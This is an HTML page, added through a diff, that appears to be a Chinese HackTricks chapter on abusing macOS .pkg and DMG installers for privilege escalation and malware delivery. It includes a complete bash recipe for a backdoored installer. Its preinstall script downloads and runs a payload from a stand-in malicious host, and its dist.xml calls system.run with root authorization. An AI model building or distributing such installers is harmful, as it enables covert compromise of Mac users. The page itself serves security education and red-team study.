@@ -1,0 +1,358 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>macOS Installers Abuse</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../favicon.png">
+        <link rel="stylesheet" href="../../../css/variables.css">
+        <link rel="stylesheet" href="../../../css/general.css">
+        <link rel="stylesheet" href="../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../highlight.css">
+        <link rel="stylesheet" href="../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="macos-安装程序滥用"><a class="header" href="#macos-安装程序滥用">macOS 安装程序滥用</a></h1>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a>** 上关注我们。**</li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<h2 id="pkg-基本信息"><a class="header" href="#pkg-基本信息">pkg 基本信息</a></h2>
+<p>macOS <strong>安装包</strong>（也称为 <code>.pkg</code> 文件）是一种文件格式，用于 macOS <strong>分发软件</strong>。这些文件就像一个 <strong>包含软件安装和正常运行所需的一切的盒子</strong>。</p>
+<p>包文件本身是一个存档，包含一个 <strong>将在目标计算机上安装的文件和目录的层次结构</strong>。它还可以包括 <strong>脚本</strong>，在安装前后执行任务，例如设置配置文件或清理旧版本的软件。</p>
+<h3 id="层次结构"><a class="header" href="#层次结构">层次结构</a></h3>
+<figure><img src="../../../.gitbook/assets/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>
+<ul>
+<li><strong>分发 (xml)</strong>：自定义（标题、欢迎文本……）和脚本/安装检查</li>
+<li><strong>PackageInfo (xml)</strong>：信息、安装要求、安装位置、要运行的脚本路径</li>
+<li><strong>材料清单 (bom)</strong>：要安装、更新或删除的文件列表及文件权限</li>
+<li><strong>有效载荷 (CPIO 存档 gzip 压缩)</strong>：从 PackageInfo 中在 <code>install-location</code> 安装的文件</li>
+<li><strong>脚本 (CPIO 存档 gzip 压缩)</strong>：安装前和安装后的脚本以及提取到临时目录以供执行的更多资源。</li>
+</ul>
+<h3 id="解压缩"><a class="header" href="#解压缩">解压缩</a></h3>
+<pre><code class="language-bash"># Tool to directly get the files inside a package
+pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"
+
+# Get the files ina. more manual way
+mkdir -p "/path/to/out/dir"
+cd "/path/to/out/dir"
+xar -xf "/path/to/package.pkg"
+
+# Decompress also the CPIO gzip compressed ones
+cat Scripts | gzip -dc | cpio -i
+cpio -i &lt; Scripts
+</code></pre>
+<p>为了在不手动解压缩的情况下可视化安装程序的内容，您还可以使用免费的工具 <a href="https://mothersruin.com/software/SuspiciousPackage/"><strong>Suspicious Package</strong></a>。</p>
+<h2 id="dmg-基本信息"><a class="header" href="#dmg-基本信息">DMG 基本信息</a></h2>
+<p>DMG 文件，或称 Apple 磁盘映像，是苹果的 macOS 用于磁盘映像的文件格式。DMG 文件本质上是一个 <strong>可挂载的磁盘映像</strong>（它包含自己的文件系统），其中包含通常被压缩且有时被加密的原始块数据。当您打开 DMG 文件时，macOS <strong>将其挂载，就像它是一个物理磁盘</strong>，允许您访问其内容。</p>
+<p>{% hint style="danger" %}
+请注意，<strong><code>.dmg</code></strong> 安装程序支持 <strong>如此多的格式</strong>，以至于在过去，一些包含漏洞的格式被滥用以获得 <strong>内核代码执行</strong>。
+{% endhint %}</p>
+<h3 id="层级结构"><a class="header" href="#层级结构">层级结构</a></h3>
+<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>
+<p>DMG 文件的层级结构可以根据内容而有所不同。然而，对于应用程序 DMG，它通常遵循以下结构：</p>
+<ul>
+<li>顶层：这是磁盘映像的根。它通常包含应用程序，并可能包含指向应用程序文件夹的链接。</li>
+<li>应用程序 (.app)：这就是实际的应用程序。在 macOS 中，应用程序通常是一个包含许多单独文件和文件夹的包，这些文件和文件夹构成了该应用程序。</li>
+<li>应用程序链接：这是指向 macOS 中应用程序文件夹的快捷方式。这样做的目的是方便您安装应用程序。您可以将 .app 文件拖到此快捷方式上以安装该应用程序。</li>
+</ul>
+<h2 id="通过-pkg-滥用进行权限提升"><a class="header" href="#通过-pkg-滥用进行权限提升">通过 pkg 滥用进行权限提升</a></h2>
+<h3 id="从公共目录执行"><a class="header" href="#从公共目录执行">从公共目录执行</a></h3>
+<p>如果预安装或后安装脚本例如从 <strong><code>/var/tmp/Installerutil</code></strong> 执行，攻击者可以控制该脚本，从而在每次执行时提升权限。或者另一个类似的例子：</p>
+<figure><img src="../../../.gitbook/assets/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>
+<h3 id="authorizationexecutewithprivileges"><a class="header" href="#authorizationexecutewithprivileges">AuthorizationExecuteWithPrivileges</a></h3>
+<p>这是一个 <a href="https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg">公共函数</a>，多个安装程序和更新程序将调用它以 <strong>以 root 身份执行某些操作</strong>。此函数接受要 <strong>执行</strong> 的 <strong>文件</strong> 的 <strong>路径</strong> 作为参数，然而，如果攻击者能够 <strong>修改</strong> 此文件，他将能够 <strong>滥用</strong> 其以 root 身份执行以 <strong>提升权限</strong>。</p>
+<pre><code class="language-bash"># Breakpoint in the function to check wich file is loaded
+(lldb) b AuthorizationExecuteWithPrivileges
+# You could also check FS events to find this missconfig
+</code></pre>
+<p>For more info check this talk: <a href="https://www.youtube.com/watch?v=lTOItyjTTkw">https://www.youtube.com/watch?v=lTOItyjTTkw</a></p>
+<h3 id="执行通过挂载"><a class="header" href="#执行通过挂载">执行通过挂载</a></h3>
+<p>如果安装程序写入 <code>/tmp/fixedname/bla/bla</code>，可以 <strong>创建一个挂载</strong> 在 <code>/tmp/fixedname</code> 上，没有所有者，这样你就可以 <strong>在安装过程中修改任何文件</strong> 来滥用安装过程。</p>
+<p>一个例子是 <strong>CVE-2021-26089</strong>，它成功地 <strong>覆盖了一个定期脚本</strong> 以获得 root 权限。有关更多信息，请查看这个演讲: <a href="https://www.youtube.com/watch?v=jSYPazD4VcE"><strong>OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl</strong></a></p>
+<h2 id="pkg-作为恶意软件"><a class="header" href="#pkg-作为恶意软件">pkg 作为恶意软件</a></h2>
+<h3 id="空载荷"><a class="header" href="#空载荷">空载荷</a></h3>
+<p>可以仅生成一个 <strong><code>.pkg</code></strong> 文件，包含 <strong>安装前和安装后脚本</strong>，而没有任何实际载荷，除了脚本中的恶意软件。</p>
+<h3 id="分发-xml-中的-js"><a class="header" href="#分发-xml-中的-js">分发 xml 中的 JS</a></h3>
+<p>可以在包的 <strong>分发 xml</strong> 文件中添加 <strong><code>&lt;script&gt;</code></strong> 标签，这段代码将被执行，并且可以 <strong>使用 <code>system.run</code> 执行命令</strong>：</p>
+<figure><img src="../../../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>
+<h3 id="后门安装程序"><a class="header" href="#后门安装程序">后门安装程序</a></h3>
+<p>恶意安装程序使用脚本和 dist.xml 中的 JS 代码</p>
+<pre><code class="language-bash"># Package structure
+mkdir -p pkgroot/root/Applications/MyApp
+mkdir -p pkgroot/scripts
+
+# Create preinstall scripts
+cat &gt; pkgroot/scripts/preinstall &lt;&lt;EOF
+#!/bin/bash
+echo "Running preinstall script"
+curl -o /tmp/payload.sh http://malicious.site/payload.sh
+chmod +x /tmp/payload.sh
+/tmp/payload.sh
+exit 0
+EOF
+
+# Build package
+pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg
+
+# Generate the malicious dist.xml
+cat &gt; ./dist.xml &lt;&lt;EOF
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;installer-gui-script minSpecVersion="1"&gt;
+&lt;title&gt;Malicious Installer&lt;/title&gt;
+&lt;options customize="allow" require-scripts="false"/&gt;
+&lt;script&gt;
+&lt;![CDATA[
+function installationCheck() {
+if (system.isSandboxed()) {
+my.result.title = "Cannot install in a sandbox.";
+my.result.message = "Please run this installer outside of a sandbox.";
+return false;
+}
+return true;
+}
+function volumeCheck() {
+return true;
+}
+function preflight() {
+system.run("/path/to/preinstall");
+}
+function postflight() {
+system.run("/path/to/postinstall");
+}
+]]&gt;
+&lt;/script&gt;
+&lt;choices-outline&gt;
+&lt;line choice="default"&gt;
+&lt;line choice="myapp"/&gt;
+&lt;/line&gt;
+&lt;/choices-outline&gt;
+&lt;choice id="myapp" title="MyApp"&gt;
+&lt;pkg-ref id="com.malicious.myapp"/&gt;
+&lt;/choice&gt;
+&lt;pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root"&gt;#myapp.pkg&lt;/pkg-ref&gt;
+&lt;/installer-gui-script&gt;
+EOF
+
+# Buil final
+productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
+</code></pre>
+<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
+<ul>
+<li><a href="https://www.youtube.com/watch?v=iASSG0_zobQ"><strong>DEF CON 27 - 解包 Pkgs 深入了解 Macos 安装包及常见安全漏洞</strong></a></li>
+<li><a href="https://www.youtube.com/watch?v=Eow5uNHtmIg"><strong>OBTS v4.0: "macOS 安装程序的奇妙世界" - Tony Lambert</strong></a></li>
+<li><a href="https://www.youtube.com/watch?v=kCXhIYtODBg"><strong>DEF CON 27 - 解包 Pkgs 深入了解 MacOS 安装包</strong></a></li>
+<li><a href="https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages">https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages</a></li>
+</ul>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-files-folders-and-binaries/macos-bundles.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-files-folders-and-binaries/macos-memory-dumping.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-files-folders-and-binaries/macos-bundles.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-files-folders-and-binaries/macos-memory-dumping.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../elasticlunr.min.js"></script>
+        <script src="../../../mark.min.js"></script>
+        <script src="../../../searcher.js"></script>
+
+        <script src="../../../clipboard.min.js"></script>
+        <script src="../../../highlight.js"></script>
+        <script src="../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
